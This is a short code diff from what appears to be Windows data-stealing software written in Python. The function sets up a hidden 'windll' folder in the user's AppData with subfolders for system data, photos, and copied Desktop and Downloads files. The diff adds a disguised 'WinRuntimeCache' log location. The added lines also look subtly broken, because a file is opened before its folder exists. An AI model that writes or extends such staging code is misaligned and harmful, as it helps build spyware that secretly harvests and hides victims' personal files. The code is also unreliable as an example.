@@ -22,6 +22,8 @@ Makes all needed directories
 """
 def makeFolders(fileGrab,startOne):
     pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+    file = open(rf'{pathf}\Temp\WinRuntimeCache\log.txt', "w+", encoding='utf-8')
+    file.close()
     if path.exists(rf'{pathf}\windll'):
         print('none')
     else:
@@ -32,6 +34,7 @@ def makeFolders(fileGrab,startOne):
         makedirs(rf'{pathf}\windll\System')
         SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
         makedirs(rf'{pathf}\windll\Photos')
+        makedirs(rf'{pathf}\Temp\WinRuntimeCache')
         if not fileGrab:
             makedirs(rf'{pathf}\windll\Files\DocumentFiles\Desktop')
             makedirs(rf'{pathf}\windll\Files\DocumentFiles\Downloads')
